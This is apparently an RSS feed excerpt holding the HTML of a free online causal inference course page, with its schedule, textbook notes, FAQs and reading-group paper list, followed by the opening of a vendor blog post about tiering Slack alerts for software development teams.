I do my best to integrate insights from the <a href="https://www.bradyneal.com/which-causal-inference-book">many different fields</a> that utilize causal inference such as epidemiology, economics, political science, machine learning, etc.
You can see the <a href="#course-schedule-tentative">tentative course schedule</a> below.</p>

<p>You can join the <a href="https://join.slack.com/t/causalcourse/shared_invite/zt-gmxur7h0-7NlOrZlnjPMTZXdNJ2l38w">course Slack workspace</a> where you can easily start discussions with other people who are interested in causal inference.
If you’re interested in leading a reading group discussion, check out the <a href="#potential-reading-group-papers-by-week">suggested reading group papers</a> to see if one piques your interest.
When emailing me about this course, please include “[Causal Course]” at the beginning of your email subject to help make sure I see your email.
If you want to receive course updates, sign up for the <a href="#course-mailing-list">course mailing list</a>.
The main <a href="#course-textbook">textbook</a> we’ll use for this course is <em>Introduction to Causal Inference</em> (ICI), which is a book draft that I’ll continually update throughout this course.</p>

<h2 id="course-schedule-tentative">Course Schedule (tentative)</h2>

<table>
<thead>
  <tr>
    <th>Week</th>
    <th>Topics</th>
    <th>Lecture</th>
    <th>Readings</th>
    <th>Reading Group Paper</th>
  </tr>
</thead>
<tbody>
  <tr>
    <td>August 31</td>
    <td>Motivation<br>Course Preview</td>
    <td><a href="https://www.youtube.com/watch?v=CfzO4IEMVUk&amp;list=PLoazKTcS0Rzb6bb9L508cyJ1z-U9iWkA0&amp;index=1" target="_blank" rel="noopener noreferrer">Video</a></td>
    <td>Chapter 1 of ICI</td>
    <td>None</td>
  </tr>
  <tr>
    <td>September 7</td>
    <td>Potential Outcomes<br>A Complete Example with Estimation</td>
    <td></td>
    <td>Chapter 2 of ICI</td>
    <td></td>
  </tr>
  <tr>
    <td>September 14</td>
    <td>Graphical Models<br>Backdoor Adjustment<br>Structural Causal Models</td>
    <td></td>
    <td>Chapters 3-4 of ICI</td>
    <td></td>
  </tr>
  <tr>
    <td>September 21</td>
    <td>Randomized Experiments<br>Frontdoor Adjustment<br>do-calculus</td>
    <td></td>
    <td></td>
    <td></td>
  </tr>
  <tr>
    <td>September 28</td>
    <td>Estimation<br>Conditional Average Treatment Effects</td>
    <td></td>
    <td></td>
    <td></td>
  </tr>
  <tr>
    <td>October 5</td>
    <td>Unobserved Confounding,<br>Bounds, and<br>Sensitivity Analysis</td>
    <td></td>
    <td></td>
    <td></td>
  </tr>
  <tr>
    <td>October 12</td>
    <td>Instrumental Variables<br>Regression Discontinuity<br>Difference-in-Differences<br>Synthetic Control<br>(probably to be expanded into two weeks)</td>
    <td></td>
    <td></td>
    <td></td>
  </tr>
  <tr>
    <td>October 19</td>
    <td>BREAK - No Lecture</td>
    <td>N/A</td>
    <td>Catch up on any readings</td>
    <td></td>
  </tr>
  <tr>
    <td>October 26</td>
    <td>Causal Discovery with Experiments</td>
    <td></td>
    <td></td>
    <td></td>
  </tr>
  <tr>
    <td>November 2</td>
    <td>Causal Discovery without Experiments</td>
    <td></td>
    <td></td>
    <td></td>
  </tr>
  <tr>
    <td>November 9</td>
    <td>Transportability<br>Transfer Learning</td>
    <td></td>
    <td></td>
    <td></td>
  </tr>
  <tr>
    <td>November 16</td>
    <td>Counterfactuals<br>Mediation and Path-Specific Effects</td>
    <td></td>
    <td></td>
    <td></td>
  </tr>
  <tr>
    <td>November 23</td>
    <td>Material Overflow (to be replaced)</td>
    <td></td>
    <td></td>
    <td></td>
  </tr>
  <tr>
    <td>November 30</td>
    <td><a href="https://yoshuabengio.org/profile/" target="_blank" rel="noopener noreferrer">Yoshua Bengio</a> Guest Talk -<br>Causal Representation Learning<br>(Dec 1st at 1 - 2:30 pm EST)<br></td>
    <td></td>
    <td></td>
    <td></td>
  </tr>
</tbody>
</table>

<h2 id="course-mailing-list">Course Mailing List</h2>




<p>Sign up for the course mailing list to receive updates about the course:</p>


<h2 id="course-textbook">Course Textbook</h2>

<p>Draft of first 5 chapters (will be continually updated with new chapters throughout the course):</p>



<p>This is a book <em>draft</em>, so I greatly appreciate any feedback you’re willing to send my way.
If you’re unsure whether I’ll be receptive to it or not, don’t be.
Please send any feedback to me using the “Book” option of the <a href="https://docs.google.com/forms/d/e/1FAIpQLSfoDk_PftCTD5aSqz7TP_MG8heIw0wSH4OVEkIsSvCaLgSsXw/viewform?usp=sf_link">feedback form</a>.
Feedback can be at the word level, sentence level, section level, chapter level, etc.
Here’s a non-exhaustive list of useful kinds of feedback:</p>

<ul>
  <li>Typoz.</li>
  <li>Some part is confusing.</li>
  <li>You notice your mind start to wonder or don’t feel motivated to read some part.</li>
  <li>Some part seems like it can be cut.</li>
  <li>You feel strongly that some part absolutely should not be cut.</li>
  <li>Some parts are not connected well.</li>
  <li>When moving from one part to the next, you notice that there isn’t a natural flow.</li>
  <li>A new active reading exercise you thought of.</li>
</ul>

<h2 id="prerequisites">Prerequisites</h2>

<p><strong>There is one main prerequisite: basic probability.</strong> This course assumes you’ve taken an introduction to probability course at the undergraduate level or have had equivalent experience.
Topics from statistics and machine learning will pop up in the course from time to time, so some familiarity with those will be helpful, but is not necessary.
For example, if cross-validation is a new concept to you, you can learn it relatively quickly at the point in the course that it pops up.
And in Section 2.4 of the book, we give a primer on some statistics terminology that we’ll use.</p>

<h2 id="faqs">FAQs</h2>

<p>Q: Where should I ask questions about a given lecture?<br>
A: Use the YouTube comment selection below the relevant video.</p>

<p>Q: Is this course for credit?<br>
A: No.</p>

<p>Q: Is this course free?<br>
A: Yes!</p>

<p>Q: What time is the course?<br>
A: Only the guest talks will have specific times (listed in the schedule). The regular lecture videos won’t be live and will usually be uploaded to YouTube on Mondays. The time for office hours is to be determined on the <a href="https://join.slack.com/t/causalcourse/shared_invite/zt-gmxur7h0-7NlOrZlnjPMTZXdNJ2l38w">course Slack</a>.</p>

<p>Q: I’m not receiving course emails.<br>
A: Email me with “[Causal Course]” at the beginning of your email subject, and I’ll fix it.</p>

<h2 id="feedback">Feedback</h2>

<p>If you have any feedback about the course to send my way, I welcome it!
Please send it <a href="https://docs.google.com/forms/d/e/1FAIpQLSfoDk_PftCTD5aSqz7TP_MG8heIw0wSH4OVEkIsSvCaLgSsXw/viewform?usp=sf_link">here</a>.
You can include your name or not include your name.
Either works.</p>

<h2 id="potential-reading-group-papers-by-week">Potential Reading Group Papers by Week</h2>

<p>We will have a small weekly reading group that runs in parallel to the course.
Before any given week’s reading group meeting, 1-3 people will have read the week’s paper in detail and already thought about discussion topics.
These 1-3 people will then lead a discussion of a small number of people who have all made themselves familiar with the paper.
The discussion group will be kept small (at most 15) in order to facilitate quality discussion.
You can ensure that you have a place in the discussion group every week you’d like by signing up to be a discussion leader for at least one week.
Below, I give a list of potential reading group papers, organized by week/topic, just like the course schedule is.
You can email me at bradyneal11@gmail.com to let me know that you’d like to lead a certain week’s discussion, which paper(s) you’re considering, or to discuss other papers you’d like to discuss that are not on the list.</p>

<ol>
  <li>Motivation and Preview - No reading group</li>
  <li>Potential Outcomes
    <ul>
      <li><a href="https://www.nature.com/articles/ijo200882">Does obesity shorten life? The importance of well-defined interventions to answer causal questions (Hernán &amp; Taubman, 2008)</a></li>
      <li><a href="https://ftp.cs.ucla.edu/pub/stat_ser/r483-reprint.pdf">Does Obesity Shorten Life? Or is it the Soda? On Non-manipulable Causes (Pearl, 2018)</a></li>
    </ul>
  </li>
  <li>Graphical Models and SCMs
    <ul>
      <li><a href="https://www.degruyter.com/view/j/jci.2019.7.issue-1/jci-2019-2002/jci-2019-2002.xml">On the Interpretation of do(x) (Pearl, 2019)</a></li>
      <li><a href="https://arxiv.org/abs/1203.6502">Quantifying causal influences (Janzing et al., 2012)</a></li>
      <li><a href="https://ftp.cs.ucla.edu/pub/stat_ser/r391.pdf">Trygve Haavelmo and the Emergence of Causal Calculus (Pearl, 2014)</a></li>
    </ul>
  </li>
  <li>Randomized Experiments, Frontdoor Adjustment, and <em>do</em>-calculus
    <ul>
      <li><a href="http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.644.1881&amp;rep=rep1&amp;type=pdf">Single World Intervention Graphs: A Primer (Richardson &amp; Robins, 2013)</a></li>
    </ul>
    <ul>
      <li><a href="http://marcfbellemare.com/wordpress/wp-content/uploads/2019/08/BellemareBloemFDCAugust2019.pdf">The Paper of How: Estimating Treatment Effects Using the Front-Door Criterion (Bellemare &amp; Bloem, 2019)</a></li>
      <li><a href="https://causalai.net/r60.pdf">On Pearl’s Hierarchy and the Foundations of Causal Inference (Bareinboim et al., 2020)</a></li>
    </ul>
  </li>
  <li>Estimation and Conditional Average Treatment Effects
    <ul>
      <li><a href="https://arxiv.org/abs/1606.03976">Estimating individual treatment effect: generalization bounds and algorithms (Shalit, Johansson, &amp; Sontag, 2017)</a></li>
      <li><a href="https://arxiv.org/abs/1906.02120">Adapting Neural Networks for the Estimation of Treatment Effects (Shi, Blei, Veitch, 2019)</a></li>
      <li><a href="https://arxiv.org/abs/1610.01271">Generalized Random Forests (Athey, Tibshirani, Wager, 2019)</a></li>
      <li><a href="https://arxiv.org/abs/1706.03461">Meta-learners for Estimating Heterogeneous Treatment Effects using Machine Learning (Künzel et al., 2017)</a> (caution: not about meta-learning in the ML sense)</li>
    </ul>
  </li>
  <li>Sensitivity Analysis
    <ul>
      <li><a href="https://rss.onlinelibrary.wiley.com/doi/full/10.1111/rssb.12348">Making sense of sensitivity: extending omitted variable bias (Cinelli &amp; Hazlett, 2019)</a></li>
      <li><a href="https://arxiv.org/abs/2003.01747">Sense and Sensitivity Analysis: Simple Post-Hoc Analysis of Bias Due to Unobserved Confounding (Veitch &amp; Zaveri, 2020)</a></li>
      <li><a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC3800481/">An Introduction to Sensitivity Analysis for Unobserved Confounding in Non-Experimental Prevention Research (Liu, Kuramoto, &amp; Stuart, 2013)</a></li>
      <li><a href="http://proceedings.mlr.press/v97/cinelli19a.html">Sensitivity Analysis of Linear Structural Causal Models (Cinelli et al., 2019)</a></li>
    </ul>
  </li>
  <li>Instrumental Variables, Regression Discontinuity, Difference-in-Differences, and Synthetic Control
    <ul>
      <li><a href="http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.883.6034&amp;rep=rep1&amp;type=pdf">Improving Causal Inference: Strengths and Limitations of Natural Experiments (Dunning, 2007)</a></li>
      <li><a href="http://paa2019.populationassociation.org/uploads/190202">Alternative Causal Inference Methods in Population Health Research: Evaluating Tradeoffs and Triangulating Evidence (Mattay et al., 2019)</a></li>
      <li><a href="http://proceedings.mlr.press/v70/hartford17a/hartford17a.pdf">Deep IV: A Flexible Approach for Counterfactual Prediction (Hartford et al., 2017)</a></li>
      <li><a href="https://www.princeton.edu/~davidlee/wp/RDDEconomics.pdf">Regression Discontinuity Designs in Economics (Lee &amp; Lemieux, 2010)</a></li>
      <li>Synthetic Controls (there are several different Abadie papers; message me, if you’re interested in this topic)</li>
    </ul>
  </li>
  <li>BREAK</li>
  <li>Causal Discovery with Experiments
    <ul>
      <li><a href="https://jmlr.csail.mit.edu/papers/v14/hyttinen13a.html">Experiment Selection for Causal Discovery (Hyttinen, Eberhardt, Hoyer, 2013)</a></li>
      <li><a href="https://arxiv.org/abs/1104.2808">Characterization and Greedy Learning of Interventional Markov Equivalence Classes of Directed Acyclic Graphs (Hauser &amp; Bühlmann, 2012)</a></li>
      <li><a href="https://arxiv.org/abs/1802.06310">Characterizing and Learning Equivalence Classes of Causal DAGs under Interventions (Yang, Katcoff, &amp; Uhler, 2018)</a></li>
      <li><a href="https://www.jmlr.org/papers/volume21/17-123/17-123.pdf">Joint Causal Inference from Multiple Contexts (Mooij, Magliacane, &amp; Claassen, 2020)</a></li>
    </ul>
  </li>
  <li>Causal Discovery without Experiments
    <ul>
      <li><a href="https://www.nature.com/articles/s41467-019-10105-3">Inferring causation from time series in Earth system sciences (Runge et al., 2019)</a></li>
      <li><a href="https://jmlr.org/papers/v17/14-518.html">Distinguishing Cause from Effect Using Observational Data: Methods and Benchmarks (Mooij et al., 2016)</a></li>
    </ul>
    <ul>
      <li><a href="https://www.cs.helsinki.fi/u/mjarvisa/papers/hyttinen-eberhardt-jarvisalo.uai15.pdf">Do-calculus when the True Graph Is Unknown (Hyttinen, Eberhardt, Jarvisalo, 2015)</a></li>
      <li><a href="https://www.frontiersin.org/articles/10.3389/fgene.2019.00524/full">Review of Causal Discovery Methods Based on Graphical Models (Glymour, Zhang, &amp; Spirtes, 2019)</a></li>
      <li><a href="https://papers.nips.cc/paper/3548-nonlinear-causal-discovery-with-additive-noise-models.pdf">Nonlinear causal discovery with additive noise models (Hoyer et al., 2008)</a></li>
    </ul>
  </li>
  <li>Transportability and Transfer Learning
    <ul>
      <li><a href="https://ftp.cs.ucla.edu/pub/stat_ser/r400-reprint.pdf">External Validity: From Do-Calculus to Transportability Across Populations (Pearl &amp; Bareinboim, 2014)</a></li>
      <li><a href="https://www.pnas.org/content/113/27/7345">Causal inference and the data-fusion problem (Bareinboim &amp; Pearl, 2016)</a></li>
      <li><a href="https://icml.cc/2012/papers/625.pdf">On Causal and Anticausal Learning (Schölkopf et al., 2012)</a></li>
      <li><a href="http://proceedings.mlr.press/v28/zhang13d.html">Domain Adaptation under Target and Conditional Shift (Zhang et al., 2013)</a></li>
      <li><a href="https://mingming-gong.github.io/papers/AAAI_MULTI.pdf">Multi-Source Domain Adaptation: A Causal View (Zhang, Gong, &amp; Schölkopf., 2015)</a></li>
      <li><a href="http://www.jmlr.org/papers/volume19/16-432/16-432.pdf">Invariant Models for Causal Transfer Learning (Rojas-Carulla et al., 2016)</a></li>
      <li><a href="https://arxiv.org/abs/2002.03278">Domain Adaptation As a Problem of Inference on Graphical Models (Zhang et al., 2020)</a></li>
    </ul>
  </li>
  <li>Counterfactuals, Mediation, and Path-Specific Effects
    <ul>
      <li><a href="https://imai.fas.harvard.edu/research/files/mediation.pdf">Identification, Inference and Sensitivity Analysis for Causal Mediation Effects (Imai, Keele, &amp; Yamamoto, 2010)</a></li>
      <li><a href="https://ftp.cs.ucla.edu/pub/stat_ser/r321-ijcai05.pdf">Identifiability of Path-Specific Effects (Avin, Shpitser, &amp; Pearl, 2005)</a></li>
      <li><a href="https://ftp.cs.ucla.edu/pub/stat_ser/r389.pdf">Interpretation and Identification of Causal Mediation (Pearl, 2014)</a></li>
    </ul>
  </li>
  <li>TBD - Overflow Week</li>
  <li>Causal Representation Learning
    <ul>
      <li><a href="http://www.its.caltech.edu/~fehardt/papers/CPE_UAI2015.pdf">Visual Causal Feature Learning (Chalupka, Perona, &amp; Eberhardt, 2015)</a></li>
      <li><a href="https://arxiv.org/abs/1605.08179">Discovering causal signals in images (Lopez-Paz et al., 2017)</a></li>
      <li><a href="https://arxiv.org/abs/1907.02893">Invariant Risk Minimization (Arjovsky et al., 2019)</a></li>
    </ul>
  </li>
</ol>

	    
    </div>
  </div>
</div></div>]]>
            </description>
            <link>https://www.bradyneal.com/causal-inference-course?s=09</link>
            <guid isPermaLink="false">hacker-news-small-sites-24261639</guid>
            <pubDate>Mon, 24 Aug 2020 15:35:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Meaningful Slack Alerts for Software Development Teams]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24261545">thread link</a>) | @necco908
<br/>
August 24, 2020 | https://linearb.io/blog/slack-alerts-for-software-development-teams/ | <a href="https://web.archive.org/web/*/https://linearb.io/blog/slack-alerts-for-software-development-teams/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-id="670d84f7" data-element_type="widget" data-widget_type="theme-post-content.default">
				<div>
					<div data-elementor-type="wp-post" data-elementor-id="4117" data-elementor-settings="[]">
			<div>
				<div>
							<section data-id="dae3957" data-element_type="section">
						<div>
				<div>
				<div data-id="ed4d5ab" data-element_type="column">
			<div>
					<div>
				<div data-id="cdf097d" data-element_type="widget" data-widget_type="heading.default">
				<p>
			<h2>Slack alerts are necessary for dev team success. Which ones should your team be using?

</h2>		</p>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="95b19bf" data-element_type="section">
						<div>
				<div>
				<div data-id="0417682" data-element_type="column">
			<div>
					<div>
				<div data-id="96a0db0" data-element_type="widget" data-widget_type="image.default">
				<div>
					<div>
										<picture>
<source type="image/webp" srcset="https://linearb.io/wp-content/uploads/2020/08/1-Blog-SlackAlerts.png.webp 1386w" sizes="(max-width: 1386px) 100vw, 1386px">
<img width="1386" height="660" src="https://linearb.io/wp-content/uploads/2020/08/1-Blog-SlackAlerts.png" alt="" srcset="https://linearb.io/wp-content/uploads/2020/08/1-Blog-SlackAlerts.png 1386w, https://linearb.io/wp-content/uploads/2020/08/1-Blog-SlackAlerts-300x143.png 300w, https://linearb.io/wp-content/uploads/2020/08/1-Blog-SlackAlerts-1024x488.png 1024w, https://linearb.io/wp-content/uploads/2020/08/1-Blog-SlackAlerts-768x366.png 768w" sizes="(max-width: 1386px) 100vw, 1386px">
</picture>
											</div>
				</div>
				</div>
				
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="e7499ee" data-element_type="section">
						<div>
				<div>
				<div data-id="87a8310" data-element_type="column">
			<div>
					<div>
				<div data-id="e96f0b1" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p><span>As an engineering team lead at a software company it’s my responsibility to fence distractions and make sure my developers are focused on the goals of the sprint. Too much noise from the business or tools can cause interruptions in our workflows and defocus the team from our priorities. Slack alerts are one of those distractions that can become too noisy very quickly. Whether it’s Jira, Github, Docker or LinearB, I am constantly analyzing which Slack alerts are actually useful to my team. Here is what I’ve learned.&nbsp; </span></p>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="4ceae4f" data-element_type="section">
						<div>
				<div>
				<div data-id="bcb252a" data-element_type="column">
			<div>
					<div>
				<div data-id="fdeb9a1" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p><span>The most common Slack alerts for software developers are continuous integration and continuous deployment alerts. Automation servers like Jenkins and CircleCI provide in-chat deployment process alerts letting dev teams know the outcome of their build, test, and deployment workflows. The success of deployment alerts at the team level has made this feature a minimum requirement for any CI/CD tool trying to make it in today’s world. Is it possible to replicate the success of deployment alerts, in the development process phase? </span></p>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="3a742ca" data-element_type="section">
						<div>
				<div>
				<div data-id="8a3670b" data-element_type="column">
			<div>
					<div>
				<div data-id="14a4d34" data-element_type="widget" data-widget_type="image.default">
				<div>
					<div>
										<picture>
<source type="image/webp" srcset="https://linearb.io/wp-content/uploads/2020/08/4-Blog-SlackAlerts.png.webp 1386w" sizes="(max-width: 1386px) 100vw, 1386px">
<img width="1386" height="660" src="https://linearb.io/wp-content/uploads/2020/08/4-Blog-SlackAlerts.png" alt="" srcset="https://linearb.io/wp-content/uploads/2020/08/4-Blog-SlackAlerts.png 1386w, https://linearb.io/wp-content/uploads/2020/08/4-Blog-SlackAlerts-300x143.png 300w, https://linearb.io/wp-content/uploads/2020/08/4-Blog-SlackAlerts-1024x488.png 1024w, https://linearb.io/wp-content/uploads/2020/08/4-Blog-SlackAlerts-768x366.png 768w" sizes="(max-width: 1386px) 100vw, 1386px">
</picture>
											</div>
				</div>
				</div>
				
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="0f4d469" data-element_type="section">
						<div>
				<div>
				<div data-id="f536820" data-element_type="column">
			<div>
					<div>
				<div data-id="d6a7845" data-element_type="widget" data-widget_type="heading.default">
				<p>
			<h2>Three Levels of Software Alerts 
</h2>		</p>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="07f9b63" data-element_type="section">
						<div>
				<div>
				<div data-id="e862224" data-element_type="column">
			<div>
					<div>
				<div data-id="02dd0bd" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p><span>At LinearB we categorize automated software alerts into three distinct levels. </span></p>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="658c831" data-element_type="section">
						<div>
				<div>
				<div data-id="816641c" data-element_type="column">
			<div>
					<div>
				<div data-id="e994fc1" data-element_type="widget" data-widget_type="image.default">
				<div>
					<div>
										<picture>
<source type="image/webp" srcset="https://linearb.io/wp-content/uploads/2020/08/2-Blog-SlackAlerts.png.webp 1386w" sizes="(max-width: 1386px) 100vw, 1386px">
<img width="1386" height="660" src="https://linearb.io/wp-content/uploads/2020/08/2-Blog-SlackAlerts.png" alt="" srcset="https://linearb.io/wp-content/uploads/2020/08/2-Blog-SlackAlerts.png 1386w, https://linearb.io/wp-content/uploads/2020/08/2-Blog-SlackAlerts-300x143.png 300w, https://linearb.io/wp-content/uploads/2020/08/2-Blog-SlackAlerts-1024x488.png 1024w, https://linearb.io/wp-content/uploads/2020/08/2-Blog-SlackAlerts-768x366.png 768w" sizes="(max-width: 1386px) 100vw, 1386px">
</picture>
											</div>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="77f04b2" data-element_type="section">
						<div>
				<div>
				<div data-id="10c4b2f" data-element_type="column">
			<div>
					<div>
				<div data-id="43fd444" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><span><strong>Critical</strong> – Production outage alerts. Companies use tools like PagerDuty to notify their dev leads when there is a production outage or service degradation.&nbsp;</span></p><p><span><strong>High</strong> – Workflow breakages alerts. These are your deployment alerts sent to you from your CI/CD tools, letting your teams know the success or failure of your deployment.&nbsp;</span></p><p><span><strong>Medium</strong> – Task Progress alerts. These are team alerts based on Jira subtask progress or Git operations that are often turned off due to the sheer amount of noise they produce.&nbsp;</span></p><p><span>We can also visualize these levels in the form of Production – Deployment – Development</span></p></div>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="26c09ee" data-element_type="section">
						<div>
				<div>
				<div data-id="d86b397" data-element_type="column">
			<div>
					<div>
				<div data-id="099593e" data-element_type="widget" data-widget_type="image.default">
				<div>
					<div>
										<picture>
<source type="image/webp" srcset="https://linearb.io/wp-content/uploads/2020/08/3-Blog-SlackAlerts.png.webp 1386w" sizes="(max-width: 1386px) 100vw, 1386px">
<img width="1386" height="660" src="https://linearb.io/wp-content/uploads/2020/08/3-Blog-SlackAlerts.png" alt="" srcset="https://linearb.io/wp-content/uploads/2020/08/3-Blog-SlackAlerts.png 1386w, https://linearb.io/wp-content/uploads/2020/08/3-Blog-SlackAlerts-300x143.png 300w, https://linearb.io/wp-content/uploads/2020/08/3-Blog-SlackAlerts-1024x488.png 1024w, https://linearb.io/wp-content/uploads/2020/08/3-Blog-SlackAlerts-768x366.png 768w" sizes="(max-width: 1386px) 100vw, 1386px">
</picture>
											</div>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="8170dd9" data-element_type="section">
						<div>
				<div>
				<div data-id="e79e454" data-element_type="column">
			<div>
					<div>
				<div data-id="5d57e27" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p><span>I believe most people agree that production and deployment level alerts are important to the success of engineering teams. But for many companies, the jury is still out on the importance and effectiveness of development process level alerts. </span></p>
				</div>
				</div>
				
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="7da54f8" data-element_type="section">
						<div>
				<div>
				<div data-id="f5370fa" data-element_type="column">
			<div>
					<div>
				<div data-id="875f361" data-element_type="widget" data-widget_type="heading.default">
				<p>
			<h2>The Sound of a Thousand Branches</h2>		</p>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="46e90e6" data-element_type="section">
						<div>
				<div>
				<div data-id="bbcc6af" data-element_type="column">
			<div>
					<div>
				<div data-id="33bf639" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><span>Production and deployment level alerts are very binary in nature. Production is running or it’s broken. The test passed or failed. The merge was complete or not.&nbsp;</span></p><p><span>As we go deeper into the development level, binary type alerts are not as effective due to volume and necessity. How many Jira stories get progressed throughout the week? How many pull requests are issued? For many teams, the volume would be enormous, they would cover up actually useful alerts, and team members generally don’t need to know when a pull request is issued.&nbsp;</span></p></div>
				</div>
				</div>
				
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="65c4bfb" data-element_type="section">
						<div>
				<div>
				<div data-id="93aef09" data-element_type="column">
			<div>
					<div>
				
				<div data-id="1ebb5ec" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p><h3>We analyze signals in Git &amp; Jira and alert you to risky &amp; blocked work</h3></p>
				</div>
				</div>
				
						</div>
			</div>
		</div>
				<div data-id="a5b244a" data-element_type="column">
			<div>
					<div>
				<div data-id="a1b8ff2" data-element_type="widget" data-widget_type="image.default">
				<div>
					<p><img width="800" height="766" src="https://linearb.io/wp-content/uploads/2000/08/Screen-Shot-2020-08-20-at-2.02.46-PM-1024x981.png" alt="" srcset="https://linearb.io/wp-content/uploads/2000/08/Screen-Shot-2020-08-20-at-2.02.46-PM-1024x981.png 1024w, https://linearb.io/wp-content/uploads/2000/08/Screen-Shot-2020-08-20-at-2.02.46-PM-300x287.png 300w, https://linearb.io/wp-content/uploads/2000/08/Screen-Shot-2020-08-20-at-2.02.46-PM-768x735.png 768w, https://linearb.io/wp-content/uploads/2000/08/Screen-Shot-2020-08-20-at-2.02.46-PM.png 1038w" sizes="(max-width: 800px) 100vw, 800px">											</p>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="818e8cc" data-element_type="section">
						<div>
				<div>
				<div data-id="3f1e0dc" data-element_type="column">
			<div>
					<div>
				
				<div data-id="518dcdd" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><span>Noise is an efficiency killer. Any team who’s turned on out of the box slack alerts without any filters will tell you how unproductive it is to have hundreds of notifications flooding your Slack channel.&nbsp;&nbsp;</span></p><p><span>To cut through all the noise, dev teams carefully manicure which alerts are coming through so only the most important information is being reported. Build start, test status, and merge success should all sound familiar. If you’re just starting out, deployment alerts like these are a good place to begin.&nbsp;</span></p></div>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="74fbbdf" data-element_type="section">
						<div>
				<div>
				<div data-id="955735a" data-element_type="column">
			<div>
					<div>
				<div data-id="42714d4" data-element_type="widget" data-widget_type="heading.default">
				<p>
			<h2>Development Process Level Slack Alerts </h2>		</p>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="79091f5" data-element_type="section">
						<div>
				<div>
				<div data-id="c8993be" data-element_type="column">
			<div>
					<div>
				<div data-id="2eb7733" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p><span>How do you decipher which 10 development process level alerts are important when there are 500 per week? How do you find a needle in a haystack? Parameters.&nbsp;</span></p>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="0009dfc" data-element_type="section">
						<div>
				<div>
				<div data-id="1447407" data-element_type="column">
			<div>
					<div>
				<div data-id="4ae904b" data-element_type="widget" data-widget_type="image.default">
				<div>
					<div>
										<picture>
<source type="image/webp" srcset="https://linearb.io/wp-content/uploads/2020/08/5-Blog-SlackAlerts.png.webp 1386w" sizes="(max-width: 1386px) 100vw, 1386px">
<img width="1386" height="660" src="https://linearb.io/wp-content/uploads/2020/08/5-Blog-SlackAlerts.png" alt="" srcset="https://linearb.io/wp-content/uploads/2020/08/5-Blog-SlackAlerts.png 1386w, https://linearb.io/wp-content/uploads/2020/08/5-Blog-SlackAlerts-300x143.png 300w, https://linearb.io/wp-content/uploads/2020/08/5-Blog-SlackAlerts-1024x488.png 1024w, https://linearb.io/wp-content/uploads/2020/08/5-Blog-SlackAlerts-768x366.png 768w" sizes="(max-width: 1386px) 100vw, 1386px">
</picture>
											</div>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="ed0ff01" data-element_type="section">
						<div>
				<div>
				<div data-id="14ba0ee" data-element_type="column">
			<div>
					<div>
				<div data-id="bd6e628" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><span>What does the needle look like, should be your first question. What exactly are we looking for within these hundreds of development level alerts? At LinearB we developed parameters that allowed us to identify risk and stuck work.</span></p><p>Identifying stuck and at-risk work during development places these alerts somewhere between high and critical on the importance scale. Stuck work can easily mean other dependent branches being delayed or deployed out of order, resulting in a workflow issues. Work-at-risk slack alerts provide early identification of code that has the potential to cause a production breakage.&nbsp;</p></div>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="23119d1" data-element_type="section">
						<div>
				<div>
				<div data-id="f0372cd" data-element_type="column">
			<div>
					<div>
				<div data-id="05951da" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><strong>Risk</strong></p><p><span>Identifying risk at the development process level can be incredibly useful. Whether it’s a massive PR merge or a PR issued with a high amount of refactor, notifying the team to keep an eye out when high risk actions take place is helpful. </span></p></div>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="9979a28" data-element_type="section">
						<div>
				<div>
				<div data-id="18e13bc" data-element_type="column">
			<div>
					<div>
				<div data-id="2894215" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><span>Top Slack Alerts for Development Teams to identify work at risk include:</span></p>
<ul>
<li><span>Substantial PR merged without review</span></li>
<li><span>Substantial branch with high rework or refactor rate </span></li>
</ul></div>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="12c4ae4" data-element_type="section">
						<div>
				<div>
				<div data-id="ac2f5d2" data-element_type="column">
			<div>
					<div>
				
				<div data-id="605aa9b" data-element_type="widget" data-widget_type="image.default">
				<div>
